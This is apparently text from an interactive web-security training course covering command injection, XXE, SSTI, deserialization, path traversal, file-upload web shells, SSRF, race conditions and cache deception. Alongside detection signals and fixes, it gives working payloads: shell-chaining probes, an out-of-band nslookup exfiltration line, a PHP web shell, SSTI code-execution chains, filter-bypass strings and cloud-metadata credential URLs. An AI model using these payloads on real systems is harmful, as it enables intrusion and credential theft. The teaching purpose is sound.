    Search the directory, then tap * to widen the filter to everyone — and an injected clause (*)(userPassword=*) to drag out an attribute that was never meant to be searchable.

    OS Command Injection
    
      
    Every injection so far stayed inside a query language. This one breaks out of the app entirely — one field, and the shell runs a second command of your choosing on the operating system.
    
    
    
    
    

      
    So what is command injection?
    
      
    Some features legitimately shell out to the OS — ping a host, convert a file, look something up. When the app builds that command by gluing input into a string handed to a shell, a shell metacharacter in your input starts a new command. It runs with the web server’s privileges. This is one route to RCE (remote code execution) — OWASP A03:Injection, CWE-78.
    

            
    What can an attacker achieve?
    
      
    This is the big one: if your input reaches a shell, a successful attack is usually arbitrary command execution on the server as the web user — a foothold for full compromise. From one ; whoami you move to reading files, reaching internal systems, and (via blind / out-of-band techniques) exfiltrating data even when no output comes back in the response.
    


    Ways to chain a command
    
      
    The shell treats each of these as “end this command, start another” — any one, dropped into a field, appends yours:
    
      
      
        
    • ; — run the next command unconditionally.
      • 
        
    • && / || — run next if the first succeeded / failed.
      • 
        
    • | — pipe output into the next command.
      • 
        
    • $(…) or `…` — run a command and substitute its output inline.
      • 
        
    • A newline — a fresh command line.
      • 
      
    

      
    How do I find it?
    
      
    Two cases, and you detect them differently:
    
      
    
        
    CaseHow you confirm it
    
        
    VerboseThe command’s output shows on the page — append ; whoami or | whoami and a username (www-data) appears (the console below).
    
        
    BlindNo output comes back, so you make a measurable effect: a time delay ; sleep 10 / & ping -c 10 127.0.0.1 &; redirect output to a web-readable file then fetch it; or an OAST DNS callback ; nslookup $(whoami).you.oast.site.
    
      
    
      
    Where do you do this, and first commands
    Any field that reaches a system call — a host/filename/format box — best caught in Burp → Repeater. Once it lands: whoami · id · uname -a · hostname — who and where you are.
    

      
    The attack, step by step
    
      
      
        
    1. Append a probe. Add ; whoami to the value. The shell ends the app’s command and runs yours — a username in the response confirms execution.
      2. 
        
    2. Read something. Swap it for && cat /etc/passwd (Linux) or & type C:\Windows\win.ini (Windows) — now you’re reading files.
      3. 
        
    3. Escalate. The same field takes a reverse-shell one-liner — a full foothold. From “ping a host” to owning the box.
      4. 
      
    

      
    The one line (SOC)
    A web server process spawning a child shell it doesn’t normally spawn — bash, cmd.exe, sh -c — is one of the highest-confidence signals in this whole session. Process-lineage telemetry (Sysmon Event ID 1, EDR process trees) catches it even when the request looks ordinary.
    

      
    How do I stop it?
    
      
    Remember
    If a feature needs a system command, call the program directly with a fixed argument array (an exec API that takes args, not a string) — never build a shell command from input. Allow-list what the value may contain. This is the highest-severity pattern in the injection family: it doesn’t stop at data, it reaches the OS.
    

      
    Now see it happen
    Tap a payload and watch one input field turn into two commands. The shell doesn’t see “a hostname” — it sees a string, and a metacharacter (; | &&) tells it where your command begins.

    XXE Injection
    
      
    XML parsers can do more than read data — by design, an entity can point at a file or URL and the parser fetches it for you. One self-defined reference, and the document reads the server’s files back to you.
    
    
    
    
    

      
    So what is XXE?
    
      
    XML lets a document declare its own entities — named placeholders — inside a DOCTYPE. An external entity uses SYSTEM to name a URL or file path, and a parser with that feature on will fetch it while parsing. If the app echoes the parsed value back, the fetched content comes with it. OWASP A05, CWE-611.
    

            
    What can an attacker achieve?
    
      
    A vulnerable XML parser that resolves external entities gives an attacker several wins: read arbitrary local files (/etc/passwd, configs with secrets), SSRF (make the server request internal URLs), and sometimes denial-of-service or out-of-band data exfiltration. The server does the reading for you — the entity is just a pointer you control.
    


    Why it happens
    
      
    The dangerous feature is on by default in many XML libraries. DTD processing and external-entity resolution were part of XML’s original design — meant for document composition — and almost no modern app needs them, but parsers still honour a <!DOCTYPE> an attacker supplies unless it is explicitly disabled.
    

      
    How do I find it?
    
      
    
        
    Probe you sendWhat tells you it’s injectable
    
        
    Find where XML is accepted — an obvious XML body, a request whose Content-Type you switch to application/xml, or SOAP / SVG / DOCX uploadsThe endpoint parses the XML at all — that is the attack surface.
    
        
    Define a harmless internal entity and reference it: &xxe; (the first chip below)Your value comes back in the response — the parser expands entities, so an external one will too.
    
        
    External entity to file:///etc/passwdFile contents appear in the response or an error message — confirmed file read.
    
        
    Out-of-band entity pointing at your Collaborator / OAST hostA DNS/HTTP hit arrives — the tell for blind XXE when nothing is reflected.
    
      
    
      
    Where do you do this?
    In Burp → Repeater, on the XML request body. Prepend a DOCTYPE between the XML declaration and the root element, define the entity, then drop &xxe; into a field whose value the app echoes back.
    

      
    The attack, step by step
    
      
      
        
    1. Prove entities expand. Add <!DOCTYPE stockCheck [ <!ENTITY xxe "test"> ]> and set the field to &xxe;. If test is echoed back, the parser resolves entities.
      2. 
        
    2. Read a file. Swap the definition for <!ENTITY xxe SYSTEM "file:///etc/passwd">. The parser fetches the file and the contents land wherever &xxe; was echoed.
      3. 
        
    3. Turn it into SSRF. Point the same entity at http://169.254.169.254/ (cloud metadata) or an internal service — now the server makes outbound requests for you.
      4. 
      
    
      
    When nothing is reflected — blind / OOB
    If the value never comes back, make the parser call you. A parameter entity in an external DTD on your server can read a file with php://filter (base64) and append it to a URL it fetches — the file exfiltrates over the out-of-band request. Error-based XXE is the fallback: force a parse error that prints the file contents in the error message.
    

      
    The one line (SOC)
    An inbound XML body carrying a <!DOCTYPE> or <!ENTITY> declaration — especially a SYSTEM id pointing at file:// or an internal IP — is the request-side signature. On the host, the web process suddenly reading /etc/passwd or calling 169.254.169.254 is the confirming tell (process + network telemetry).
    

      
    How do I stop it?
    
      
    Remember
    Disable DTDs and external entities in the parser. One switch — disallow-doctype-decl, or turning off external general & parameter entities and XInclude — kills every XXE variant at once, whatever the payload. Per language: PHP libxml_disable_entity_loader / avoid LIBXML_NOENT, Java DocumentBuilderFactory features, .NET DtdProcessing.Prohibit, Python defusedxml. Almost no app needs the feature — turn it off.
    

      
    Now see it happen
    Point one placeholder — &xxe; — wherever you like: an inline string, then a file on disk, then an internal URL. Same reference, three very different things come back.
    

      
    
        
    
          
    You work here: Burp → Repeater — prepend a DOCTYPE to the XML body, point the entity’s SYSTEM wherever you like, and drop &xxe; into a reflected field.

    Server-Side Template Injection
    
      
    Template engines turn {{ variables }} into text. Build the template out of user input instead of passing it as data, and the engine runs the attacker’s expression — usually all the way to code execution.
    
    
    
    
    

      
    So what is SSTI?
    
      
    A template engine (Jinja2, Twig, Freemarker, ERB…) fills placeholders in a template with data. The bug is building the template itself out of user input — render("Hello " + name) instead of render("Hello {{name}}", name=name). Now anything you type is part of the template the engine executes, not data it inserts. OWASP A03, CWE-1336.
    

            
    What can an attacker achieve?
    
      
    At the severe end, PortSwigger notes, SSTI lets an attacker “achieve remote code execution, taking full control of the back-end server”; even limited SSTI is “the basis for numerous other attacks.” It arises when user input is concatenated into a template instead of passed as data — PortSwigger likens it to “poorly written prepared statements.” {{7*7}}→49 proves the expression ran; from there you escalate to the engine’s object and OS access.
    


    Why it happens
    
      
    It is almost always a convenience shortcut: a developer concatenates a value into the template string to personalise it — an email greeting, an error page, a name field — not realising the engine will parse whatever lands there. The engine is doing exactly its job; the mistake is letting attacker text become part of the program it runs.
    

      
    How do I find & identify it?
    
      
    
        
    Probe you sendWhat it tells you
    
        
    {{7*7}} / ${7*7} / <%= 7*7 %> in a reflected fieldOutput shows 49 — your input was evaluated, so it is SSTI, and the delimiter that worked points at the engine (detect + identify).
    
        
    Polyglot ${{<%[%’"}}%\An engine error appears — input reaches the template parser, and the error often names the engine and version.
    
        
    {{7*’7’}}49 → Twig; 7777777 → Jinja2 — a differential that separates look-alike delimiters.
    
        
    An invalid expression for the suspected engineA language-specific error (Ruby, Python, Java) confirms which runtime is behind the engine — the last thing you need before exploiting.
    
      
    
      
    Where do you do this, and the method
    In Burp → Repeater, on any field the page renders back. Once the engine is known, the exploit method is always the same three moves: Read that engine’s docs for built-ins and security notes → Explore the objects reachable from a template expression → Attack by chaining to a runtime object that runs commands.
    

      
    The attack, step by step
    
      
      
        
    1. Make it do math. Send <%= 7*7 %> (or {{7*7}}). If 49 comes back, input is executed — SSTI confirmed.
      2. 
        
    2. Identify the engine. The delimiter that evaluated, plus an error message, pin it — here <%= %> means ERB (Ruby) (the first PortSwigger lab).
      3. 
        
    3. Reach the runtime. ERB evaluates Ruby, so <%= system('id') %> runs a shell command. In Jinja2 you’d instead walk the object chain — {{ cycler.__init__.__globals__.os.popen('id').read() }} — to reach os.
      4. 
      
    

      
    Why it almost always becomes RCE
    Every template engine exposes some object to the template — a loop helper, a config, a built-in. From that single object an attacker pivots through the language’s own attributes (__class__, __globals__, __builtins__ in Python) until they reach os / subprocess. The template was only meant to format text; the language underneath it can do anything.
    

      
    The one line (SOC)
    Template metacharacters ({{ }} ${ <%=) in a field that gets rendered back is the request-side tell. The RCE step then looks exactly like OS command injection in process telemetry — a web / template process spawning sh -c it never normally spawns (Sysmon ID 1, EDR process trees).
    

      
    How do I stop it?
    
      
    Remember
    Pass input as data, never build the template from it. render(tpl, name=name) is safe; render(tpl + name) is not. Where users genuinely must supply templates, use a logic-less engine (Mustache) or a locked-down sandbox — and never run user templates with full runtime access.
    

      
    Now see it happen
    Fire one probe and watch the engine give itself away: {{7*7}} comes back as 49, {{7*'7'}} fingerprints Jinja2, and an ERB payload runs a shell command — the template was built from your input, so your input executes.

    Insecure Deserialization
    
      
    Serialization turns an object into bytes to store or send; deserialization rebuilds it. When the app rebuilds an object from bytes the client controls, you get to choose what it rebuilds — a tampered field, or an object that runs code as it’s reconstructed.
    
    
    
    
    

      
    So what is insecure deserialization?
    
      
    Apps serialize objects (to bytes or a string) to round-trip state — a session cookie, a hidden field, a cache entry. Deserialization rebuilds the object from those bytes. The bug is rebuilding from attacker-controlled bytes: the app treats the returned object as if it had written it. Formats carry type information (PHP O:4:"User":…, Java ac ed 00 05, Python pickle), so you can change not just values but the class being instantiated.
    

            
    What can an attacker achieve?
    
      
    Insecure deserialization “provides an entry point to a massively increased attack surface” — reusing the app’s own classes to reach remote code execution, privilege escalation, arbitrary file access, or DoS. The trap PortSwigger highlights: post-deserialization validation doesn’t save you, because “the deserialization process itself can initiate an attack, even if the website’s own functionality does not directly interact with the malicious object.”
    


    Why it happens
    
      
    Round-tripping state through the client is convenient — stash the whole user object in a cookie, read it back on the next request. The flaw is treating the returned bytes as if the app had written them. Worse, deserialization libraries run constructor-like callbacks (PHP __wakeup/__destruct, Java readObject) automatically during rebuild — so some attacks finish before deserialization even completes.
    

      
    Two levels of damage
    
      
      
        
    • Attribute tampering — flip a field the object carries (isAdmin, userId, a price) and the app trusts it after rebuilding (the second chip below). Same family as mass assignment, carried in a serialized blob.
      • 
        
    • Gadget chains → RCE — craft an object of a class whose magic method does something dangerous. It fires automatically on rebuild; tools like ysoserial (Java) and PHGGC (PHP) chain existing library methods to reach code execution.
      • 
      
    

      
    How do I find it?
    
      
    
        
    What to look for / sendWhat tells you it’s there
    
        
    Serialized blobs in cookies, hidden fields, paramsPHP O:4:"User":…, Java rO0AB… (base64) / bytes ac ed 00 05, .NET AAEAAAD…, Python pickle gASV… — that is a deserialization surface.
    
        
    Flip one attribute: admin";b:0 → b:1Behaviour changes — the object is trusted. Keep PHP length prefixes consistent (s:5 = exactly 5 chars) or deserialization fails.
    
        
    Swap in a known gadget (ysoserial / PHGGC payload)A time delay, an OAST hit, or command output — confirms a reachable gadget chain.
    
      
    
      
    Where do you do this?
    In Burp → Repeater (or Decoder for the base64 step). Identify the format from its prefix, decode, edit the one field or substitute a gadget object, keep length prefixes valid, re-encode, resend.
    

      
    The attack, step by step
    
      
      
        
    1. Find & decode. Spot a serialized blob in a cookie and base64-decode it to reveal the typed object — O:4:"User":2:{…}.
      2. 
        
    2. Tamper an attribute. Change admin";b:0 to b:1, re-encode, resend — the rebuilt object makes you admin (the first PortSwigger lab).
      3. 
        
    3. Escalate to RCE. Replace the object with a crafted class whose __destruct() runs system(cmd) — it executes during rebuild, before the app validates anything.
      4. 
      
    

      
    Why the gadget runs before any check
    Validation is application logic — it runs after you have an object. But magic methods run as part of building the object. So a gadget object is already executing by the time the app would have inspected it. That is why “just validate after deserializing” does not save you.
    

      
    The one line (SOC)
    Serialized objects arriving from the client — rO0AB (Java), O:NN:" (PHP) in a cookie or parameter — are the signature, and any change without a valid signature is tampering. On the host, a deserializing process spawning a shell is the RCE tell (same shape as OS command injection and SSTI).
    

      
    How do I stop it?
    
      
    Remember
    Never deserialize untrusted input. If you must round-trip state through the client, sign it (HMAC) and verify the signature before deserializing, prefer a simple format (JSON with no type information), and allow-list the classes that may be instantiated. This closes the whole injection family — SQLi, NoSQL, LDAP, command, XXE, SSTI, deserialization — every one is input trusted as code.
    

      
    Now see it happen
    A serialized object rides in the session cookie. Decode it, flip one flag (admin b:0 → b:1) and the rebuilt object makes you admin — then swap the whole object for a crafted class, and it runs a command before any check.
    

      
    
        
    
          
    You work here: Burp → Repeater (or Decoder) — a serialized object rides in the session cookie. Decode it, change it, re-encode, resend.

    Path Traversal
    
      
    A feature reads a file whose name you supply. Add enough ../ and you climb out of its folder — all the way to any file the app’s user can read.
    
    
    
    
    

      
    So what is path traversal?
    
      
    Apps build a file path by joining a base directory with user input — /var/www/images/ + 218.png. Because ../ means “go up one directory,” a filename full of ../ walks out of the intended folder and reads files anywhere the process has permission — source code, config, credentials, /etc/passwd. Also called directory traversal. OWASP A01, CWE-22.
    

            
    What can an attacker achieve?
    
      
    Path traversal (a.k.a. directory traversal) lets an attacker read arbitrary files on the server — application source, /etc/passwd, SSH keys, config files holding database credentials — by escaping the intended directory with ../ sequences. Where the parameter feeds a write operation, it can escalate to overwriting files and, in the worst case, remote code execution.
    


    Why it happens
    
      
    The app treats a filename as a plain string and hands it to a file API without canonicalising — resolving all the ../ — and confirming the final path is still inside the intended folder. The operating system faithfully resolves ../ for anyone; the app just forgot to bound where the path may land.
    

      
    Getting past filters
    
      
    When a naïve defence blocks a plain ../, these commonly get through (two are shown below):
    
      
      
        
    • Absolute path — just /etc/passwd, no traversal needed.
      • 
        
    • Nested sequences — ....// becomes ../ after a non-recursive filter strips the inner one.
      • 
        
    • URL-encoding — %2e%2e%2f, double-encoded %252e%252e%252f, or Unicode ..%c0%af.
      • 
        
    • Required-base-folder — /var/www/images/../../../etc/passwd when the code insists the path start with the base.
      • 
        
    • Null byte — ../../../etc/passwd%00.png to satisfy a forced extension (older stacks).
      • 
      
    

      
    How do I find it?
    
      
    
        
    Probe you sendWhat tells you it’s injectable
    
        
    Change the filename to ../ + the same fileA 404 or a different response — the ../ moved the path, so input isn’t bounded to the folder.
    
        
    ../../../etc/passwd (Linux) / ..\..\..\windows\win.ini (Windows)File contents come back — confirmed arbitrary read.
    
        
    If ../ is filtered: try %2e%2e%2f, ....//, %252e%252e%252f, %00One variant succeeds where the plain sequence failed — the filter is incomplete.
    
      
    
      
    Where do you do this?
    Any parameter that names a file — filename, file, path, page, template, a download or image handler. In Burp → Repeater, replace the value with a traversal string; if it is blocked, cycle the encodings above.
    

      
    The attack, step by step
    
      
      
        
    1. Confirm the path moves. Send ../218.png — a 404 or a different file proves the filename is not bounded to its folder.
      2. 
        
    2. Read a file. Send ../../../etc/passwd — enough ../ to reach root, then descend to the target (the first PortSwigger lab).
      3. 
        
    3. Beat the filter. If blocked, switch form — ....// against a strip filter, %2e%2e%2f against a decode-once filter, or base-folder + %00.png against a prefix/extension check.
      4. 
      
    

      
    Why the bypasses work
    Every bypass exploits the gap between a string check and the real resolved path. The filter inspects the text you sent; the OS resolves something different — after stripping, after decoding, after the null byte truncates. Only canonicalising first and comparing the final path closes that gap.
    

      
    The one line (SOC)
    A file/path parameter carrying ../, its encoded variants (%2e%2e%2f, ..%c0%af, %252e), or an absolute path is the request-side signature. On the host, the web process reading files outside its web root (/etc/passwd, .ssh keys) is the confirming tell.
    

      
    How do I stop it?
    
      
    Remember
    Don’t build filesystem paths from user input. Best: map a request to an ID, not a filename. If you must accept a name, allow-list it (alphanumeric only), then canonicalise the resolved path and verify it still starts with the intended base directory before opening it — that one check defeats every encoding trick at once.

    File Upload → Web Shell
    
      
    An upload feature is a capability: it writes a file you control onto the server. If that file is a script and the folder runs scripts, requesting it later runs your code.
    
    
    
    
    

      
    So what is a file-upload vulnerability?
    
      
    A web shell is a script the attacker uploads and then requests over HTTP to run commands. Upload <?php system($_GET['cmd']); ?> as shell.php, request /uploads/shell.php?cmd=id, and the server executes it. The bug is accepting a file whose name, type, or contents weren’t properly validated — and storing it where it can run. OWASP A04 / A05, CWE-434.
    

            
    What can an attacker achieve?
    
      
    The headline outcome is remote code execution. If you can upload a server-executable file (a .php/.jsp web shell) and get the server to run it, you own the box — browse the filesystem, pivot internally, run commands as the web user. Even without RCE, upload flaws enable stored XSS (SVG/HTML), SSRF, and denial-of-service. The two conditions an attacker chains: the file is accepted, and its location is reachable and executed.
    


    Why it happens
    
      
    Validation is built from the easy signals — the Content-Type header the client sends, or a blacklist of bad extensions. Both are attacker-controlled or incomplete. The real questions (is the content actually an image? can this folder execute scripts? where exactly is it saved?) are harder, so they are often skipped.
    

      
    Getting past upload validation
    
      
      
        
    • Content-Type spoofing — set the multipart MIME header to image/png while the file is really PHP (gate 2 below).
      • 
        
    • Extension tricks — .phtml / .php5 / .php7, double extension shell.php.jpg, trailing dot shell.php., mixed case .pHp, or shell.php%00.jpg (gate 1).
      • 
        
    • Magic-byte polyglot — a real image signature then PHP: GIF89a;<?php…?>, or code in JPEG EXIF, so content checks pass (gate 3).
      • 
        
    • Server-config override — upload a .htaccess (AddType application/x-httpd-php .jpg) / web.config that makes a new extension executable.
      • 
        
    • Path traversal in the filename — ../../shell.php to write outside the (non-executing) upload folder into one that runs scripts.
      • 
      
    

      
    How do I find it?
    
      
    
        
    Probe you sendWhat tells you it’s exploitable
    
        
    Upload a harmless .php that echoes a marker, then request itThe marker is executed, not shown as text — the folder runs scripts.
    
        
    Re-send a blocked upload with the Content-Type changed to image/pngIt now succeeds — validation trusts the header, not the contents.
    
        
    Try a double extension / alternate (.php.jpg, .phtml) or a GIF89a polyglotOne variant is accepted and executed — the extension filter is a blacklist and content isn’t truly checked.

    In Burp → Repeater, on the multipart POST. Edit the filename= and the part’s Content-Type directly, paste the shell into the body, send, then GET the stored path with ?cmd=.

    2. Find where it landed, run it. GET /files/avatars/shell.php?cmd=whoami — the response is the command output.

    The attacker uploads a script instead of an image and gets the server to keep it under a web-accessible, script-executing path.     The one line (SOC)

    Server-Side Request Forgery
    
      
    Give the server a URL and it fetches it — from inside the network. Point that fetch at the server itself or at internal systems, and you reach places the firewall was built to keep you out of.
    
    
    
    
    

      
    So what is SSRF?
    
      
    Some features take a URL and fetch it server-side — a stock API, a webhook, “import from URL,” a PDF/thumbnail generator. SSRF is making that fetch go somewhere the app never intended. Because the request comes from the server, it lands inside the trusted network, past the firewall. OWASP A10, CWE-918.
    

            
    What can an attacker achieve?
    
      
    SSRF induces the server to make requests to somewhere it shouldn’t — and the server sits inside the trust boundary you can’t cross. That means reaching internal-only services (admin panels on localhost), cloud metadata (169.254.169.254) to steal IAM credentials, and internal APIs; in some cases it chains to RCE. The server’s identity and network position become yours.
    


    Why it happens
    
      
    Internal services were secured by network position, not by authentication — “only things already inside can reach us, so we’re safe.” SSRF breaks that assumption: the public app is inside, it will fetch any URL you hand it, and to an internal service that request looks like it came from a trusted neighbour. It is the confused deputy problem — a trusted component tricked into using its access on your behalf.
    

      
    Two targets
    
      
      
        
    • The server itself — http://localhost/ or 127.0.0.1 reach admin panels and services that only trust local requests (the first lab).
      • 
        
    • Back-end / internal systems — private ranges (10.x, 172.16.x, 192.168.x) and the cloud metadata endpoint 169.254.169.254, which often hands out IAM credentials with no auth.
      • 
      
    

      
    Getting past filters
    
      
      
        
    • Alternative IP forms — 127.1, decimal 2130706433, hex 0x7f000001, octal, IPv6 [::1].
      • 
        
    • URL-parser tricks — https://expected-host@evil, https://evil#expected-host, expected-host.evil.com.
      • 
        
    • Open redirect — point at an allowed host whose redirect sends the fetch onward to an internal target.
      • 
        
    • DNS rebinding — a hostname that resolves “safe” at validation, then to 127.0.0.1 at fetch time.
      • 
        
    • Blind SSRF — no response returned? Confirm with an OAST callback to your Collaborator.
      • 
      
    

      
    How do I find it?
    
      
    
        
    Probe you sendWhat tells you it’s exploitable
    
        
    Point a URL parameter at http://localhost/ or an internal IPA different response (an internal page, a connection error, a timeout) — the server tried to reach it.
    
        
    Point it at your Collaborator (http://you.oast.site)A DNS/HTTP hit arrives — confirms SSRF even when nothing is reflected (blind).
    
        
    Point it at 169.254.169.254/latest/meta-data/Cloud metadata comes back — often a direct path to IAM credentials.
    
      
    
      
    Where do you do this?
    Any parameter, header, or body field that carries a URL or hostname — url, stockApi, callback, dest, feed, even a Referer a backend fetches. In Burp → Repeater, swap the value for an internal target and read what returns (or watch Collaborator for blind).
    

      
    The attack, step by step
    
      
      
        
    1. Aim inward. Change the URL to http://localhost/admin — the server fetches its own admin panel, which trusts local requests (the first PortSwigger lab).
      2. 
        
    2. Escalate. Point at 169.254.169.254/latest/meta-data/iam/security-credentials/ for cloud keys, or sweep internal IPs for live services.
      3. 
        
    3. Beat the filter. If localhost/127.0.0.1 is blocked, respell the loopback — 127.1, 2130706433, [::1] — or chain an open redirect.
      4. 
      
    

      
    What changes, and why it works
    The attacker swaps the intended URL for an internal one. It works because the app fetches whatever URL it’s given, and internal services trust requests coming from the app server — they assume anything that can reach them is already inside.
    

      
    The one line (SOC)
    An outbound request from the application server to 127.0.0.1, 169.254.169.254, or a private range it doesn’t normally call is the signature. Egress monitoring and metadata-endpoint access logs are where blind SSRF — invisible in the HTTP response — still shows up.
    

      
    How do I stop it?

    Allow-list where the server may connect; block everything internal. Permit only the specific hosts the feature needs, deny loopback, link-local (169.254.x) and private ranges, require IMDSv2 for cloud metadata, resolve-then-validate to beat rebinding, and never return the raw fetched response to the user.

    Race Conditions
    
      
    The app checks something, then acts on it — but not in one indivisible step. Fire enough requests into that split-second gap and they all pass the same check before any of them updates the result.
    
    
    
    
    

      
    So what is a race condition?
    
      
    Two requests touch the same record at the same time and collide. The classic form is check-then-act (TOCTOU — time-of-check to time-of-use): the app verifies a condition, then acts on it in a separate step. In the gap between them, a second request sees the same “still valid” state — so the limit that should apply once applies many times. CWE-362.
    

            
    What can an attacker achieve?
    
      
    A race condition is a time-of-check to time-of-use gap: fire several requests inside the same tiny window and the app processes them as if each were the only one. The classic wins are limit overruns — redeem a one-per-account discount or gift card many times, withdraw the same balance twice, bypass a purchase cap — and multi-step ‘collisions’ that leave the app in a state it never meant to allow.
    


    Why it happens
    
      
    Applications assume requests are processed one at a time. In reality a server handles many concurrently, and the check and the update are separate operations with a gap between them. For those milliseconds the record still says “valid,” and every request that reads it in that window is told yes.
    

      
    Where it bites (limit overruns)
    
      
      
        
    • Redeem a gift card or discount code more times than allowed (the first lab).
      • 
        
    • Withdraw more than a balance — several transfers pass the “enough funds?” check at once.
      • 
        
    • Beat a rate limit / anti-brute-force or reuse a single CAPTCHA/OTP.
      • 
        
    • Bypass MFA via a hidden sub-state (authenticated after the password, before the second factor).
      • 
      
    

      
    The race window & how to hit it
    
      
    The window may last only milliseconds, and network jitter blurs the timing. Two techniques line the requests up:
    
      
      
        
    • Single-packet attack (HTTP/2) — PortSwigger’s method: pack 20–30 requests into one TCP packet so they arrive together, neutralising network jitter. Built into Burp Repeater’s “send group in parallel.”
      • 
        
    • Last-byte synchronisation (HTTP/1) — send all but the final byte of each request, then release the last bytes together.
      • 
        
    • Turbo Intruder — for large volumes, retries, or staggered timing.
      • 
      
    

      
    How do I find it? (predict → probe → prove)
    
      
    
        
    StepWhat you do
    
        
    PredictFind endpoints where parallel requests could touch one security-critical record — redeem, transfer, vote, reset. (Resetting different users doesn’t collide; resetting the same one does.)
    
        
    ProbeBenchmark: send the group sequentially (separate connections), then the same group as a single-packet burst — watch for any deviation (a second discount, a changed email, a duplicate).
    
        
    ProveStrip it to the minimum requests that reliably reproduce the effect, then show the impact.
    
      
    
      
    Where do you do this?
    In Burp → Repeater: add the request to a group, then “Send group in sequence” for the baseline and “Send group in parallel” for the single-packet attack. Turbo Intruder for higher volumes.
    

      
    What changes, and why it works
    The attacker sends many identical requests simultaneously instead of one. It works because the check and the update aren’t a single atomic operation — for a few milliseconds the record still says “valid,” and every request in that window is told yes.
    

      
    The one line (SOC)
    A burst of near-identical requests to a state-changing endpoint within a few milliseconds — or the second-order effect: a resource used past its limit (a coupon redeemed twice, a balance gone negative, an OTP accepted twice). Rate-per-millisecond and post-hoc invariant checks (balance < 0?) catch it.
    

      
    How do I stop it?
    
      
    Remember
    Make the check and the update one atomic operation. Do it inside a single database transaction with a row lock (SELECT … FOR UPDATE), or lean on a uniqueness constraint / conditional update (“deduct only if balance ≥ amount”) so the datastore — not app timing — enforces the limit. Idempotency keys stop duplicate submits too.
    

      
    Now see it happen

    Information Disclosure
    
      
    Not every leak is a payload. Often the app just tells you too much — a stack trace, a forgotten backup, an exposed .git — and hands over the map an attacker needs for everything else.
    
    
    
    
    

      
    So what is information disclosure?
    
      
    A site unintentionally reveals sensitive data — technical details (framework, versions, file paths, SQL), or outright secrets (credentials, keys, source). It ranges from a stack trace that helps the next attack to a backup file that is the breach. OWASP A01/A05, CWE-200.
    

            
    What can an attacker achieve?
    
      
    Information disclosure rarely ends the game on its own — it fuels every other attack. Leaked version strings, stack traces, backup files, debug pages, hidden parameters and source comments hand the attacker the exact details (framework versions, internal paths, credentials, API keys) that turn a blind probe into a targeted exploit. Treat each leak as a free clue in the chain, not a curiosity.
    


    Why it happens
    
      
    Three recurring causes: internal content left in (developer comments, debug endpoints), insecure configuration (verbose errors and directory listing enabled in production), and flawed design (different responses that let you infer things, like valid vs invalid usernames). None of it is an injected payload — the app simply ships more than it should.
    

      
    Where it leaks
    
      
      
        
    • Verbose errors / stack traces — framework, versions, paths, queries (the first source below, the first lab).
      • 
        
    • Debug pages & parameters — ?debug=true, profiler/console endpoints left on in prod.
      • 
        
    • Backups & temp files — .bak, .old, .zip, .sql, ~ copies.
      • 
        
    • Version control — an exposed /.git or /.svn = the whole source history.
      • 
        
    • Over-verbose responses — API returning fields (roles, tokens, internal IDs) the UI never shows.
      • 
        
    • Client-side breadcrumbs — HTML comments, JS source maps, robots.txt / sitemap listing hidden paths.
      • 
      
    

      
    How do I find it?

    Web Cache Deception
    
      
    A cache in front of the app stores static files to serve them fast. Trick it into caching a victim’s private page — then request that same URL yourself and read their data straight from the cache.
    
    
    
    
    

      
    So what is web cache deception?
    
      
    A cache (CDN, reverse proxy) sits in front of the app and stores responses to serve them fast. Web cache deception lures a victim to a URL the cache thinks is a static file but the origin serves as the victim’s private page. The cache stores that private response under a key the attacker also knows — so the attacker just requests it. CWE-525.
    

      
    Deception vs poisoning
    Deception (here) — store private data in the cache and read it out. Poisoning — inject malicious content into the cache so it’s served to everyone else. Same component, opposite direction.
    

            
    What can an attacker achieve?
    
      
    Web cache deception tricks the cache into storing a victim’s private, authenticated response under a URL the attacker can then request — so the attacker reads the victim’s personal data, tokens, or API keys straight from the cache, often leading to account takeover. It’s the mirror image of cache poisoning: poisoning pushes malicious content to everyone; deception pulls one victim’s private content out.
    


    Why it works — the discrepancy
    
      
    The cache and the origin parse the URL differently. The cache decides “cacheable” from a file extension or a static-looking prefix; the origin ignores or re-resolves the extra part and returns dynamic content. That gap appears as (the techniques below):
    
      
      
        
    • Static extension / path mapping — /account/x.css: cache sees .css, origin ignores the suffix and serves /account.
      • 
        
    • Delimiter differences — ; (Spring matrix params), %00, a newline, # — the origin truncates, the cache doesn’t.
      • 
        
    • Encoding / normalization — the origin decodes %2f and resolves .. segments; the cache keeps them literal.
      • 
      
    

      
    How do I find it?
    
      
    
        
    Probe you sendWhat tells you it’s exploitable
    
        
    Append /nonexistent.css (or .js, .jpg) to a private pageThe origin still returns the private page — the extension didn’t change the content.
    
        
    Re-request that URL and read the headersX-Cache: HIT / an Age header / a faster response — it was cached. (Use a cache-buster param while probing.)
    
        
    Try delimiters the cache and origin may split on (;, %2f, %00, %3f)One combination gets cached while the origin still serves private data — a parsing discrepancy.
    
      
    
      
    Where do you do this?
    In Burp: craft the URL, add a unique cache-buster per request so you read fresh responses, then confirm the cache hit from X-Cache / Age / response time. Param Miner automates cache-key probing.
    

      
    The attack, step by step
    
      
      
        
    1. Find the discrepancy. Append .css (or a delimiter) to a private page and confirm the origin still returns the private content.
      2. 
        
    2. Lure the victim. Send the logged-in victim the crafted link — their own session makes the origin return their data, and the cache stores it.
      3. 
        
    3. Read it from the cache. Request the same URL yourself — X-Cache: HIT — and the cache hands over the victim’s private page, no login needed.
      4. 
      
    

      
    What changes, and why it works
    The attacker crafts a static-looking URL to a dynamic private page and lures the victim to open it (so the victim’s own session populates the cache). It works because the cache and origin disagree on the URL, and the cache stores a personalised response under a key anyone can request.
    

      
    The one line (SOC)
    Cached responses that contain personal data, or requests to URLs like /account/*.css returning X-Cache: HIT, are the signature. Monitoring the cache for personalised content and unusual static-extension paths on dynamic routes is where it shows.
    

      
    How do I stop it?
    
      
    Remember
    Make the cache and the origin agree, and never cache the personal. Send Cache-Control: no-store, private on dynamic responses, cache by verified content type rather than URL extension, and parse/normalise paths identically on both sides. This closes the Server-side family: every attack handed untrusted input a capability — a query, a file, a request, a cache — the app forgot to bound.

    Cross-Site Scripting (XSS)
    
      
    The server sends your input back into a page — and the victim’s browser runs it as code. One reflected value becomes a script executing with someone else’s session.
    
    
    
    
    

      
    So what is XSS?
    
      
    XSS makes a site return attacker JavaScript that runs in another user’s browser, as that user. Because the script runs inside the site’s origin, it inherits the victim’s session and can do anything they can — it slips right past the same-origin policy that’s supposed to keep sites apart. OWASP A03, CWE-79.
    

            
    What can an attacker achieve?
    
      
